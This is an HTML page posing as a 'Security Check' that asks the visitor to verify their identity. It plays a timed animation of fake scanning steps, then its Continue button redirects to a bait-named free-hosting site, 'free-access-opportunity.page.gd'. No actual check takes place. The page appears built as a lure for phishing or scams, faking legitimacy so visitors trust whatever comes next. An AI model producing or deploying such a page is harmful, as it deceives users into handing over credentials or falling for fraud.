<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Security Check</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>
    body {
        margin: 0;
        padding: 0;
        font-family: Arial, Helvetica, sans-serif;
        background: #ffffff; /* WHITE BACKGROUND */
        height: 100vh;
        display: flex;
        justify-content: center;
        align-items: center;
        color: #333;
    }

    .card {
        background: #ffffff;
        padding: 30px;
        width: 320px;
        border-radius: 12px;
        text-align: center;
        box-shadow: 0 10px 30px rgba(0,0,0,0.15);
        border: 1px solid #e0e0e0;
    }

    h1 {
        margin-bottom: 10px;
        font-size: 26px;
        color: #111;
    }

    p {
        margin: 10px 0;
        font-size: 16px;
        color: #555;
    }

    .status {
        text-align: left;
        margin-top: 20px;
        font-size: 15px;
    }

    .status span {
        display: block;
        margin: 8px 0;
        opacity: 0;
        transition: opacity 0.5s ease;
        color: #333;
    }

    .status span.active {
        opacity: 1;
    }

    .loader {
        width: 40px;
        height: 40px;
        border: 4px solid #ddd;
        border-top: 4px solid #1877f2;
        border-radius: 50%;
        margin: 20px auto;
        animation: spin 1s linear infinite;
    }

    @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
    }

    button {
        margin-top: 20px;
        padding: 12px;
        width: 100%;
        font-size: 16px;
        border: none;
        border-radius: 6px;
        cursor: pointer;
        background: #1877f2;
        color: #ffffff;
        font-weight: bold;
        display: none;
    }

    button:hover {
        background: #145dbf;
    }

    .footer {
        margin-top: 15px;
        font-size: 12px;
        color: #888;
    }
</style>
</head>

<body>

<div class="card">
    <h1>Security Check</h1>
    <p>We need to verify your identity</p>

    <div class="loader" id="loader"></div>

    <div class="status">
        <span id="s1">✔ Initializing system…</span>
        <span id="s2">✔ Scanning browser…</span>
        <span id="s3">✔ Verifying connection…</span>
        <span id="s4">✔ Check completed</span>
    </div>

    <button id="continueBtn" onclick="goNext()">Continue</button>

    <div class="footer">Protected by Secure System</div>
</div>

<script>
    const steps = [
        document.getElementById("s1"),
        document.getElementById("s2"),
        document.getElementById("s3"),
        document.getElementById("s4")
    ];

    let index = 0;

    function showSteps() {
        if (index < steps.length) {
            steps[index].classList.add("active");
            index++;
            setTimeout(showSteps, 1000);
        } else {
            document.getElementById("loader").style.display = "none";
            document.getElementById("continueBtn").style.display = "block";
        }
    }

    function goNext() {
        window.location.href = 'https://free-access-opportunity.page.gd/';
    }

    showSteps();
</script>

</body>
</html>
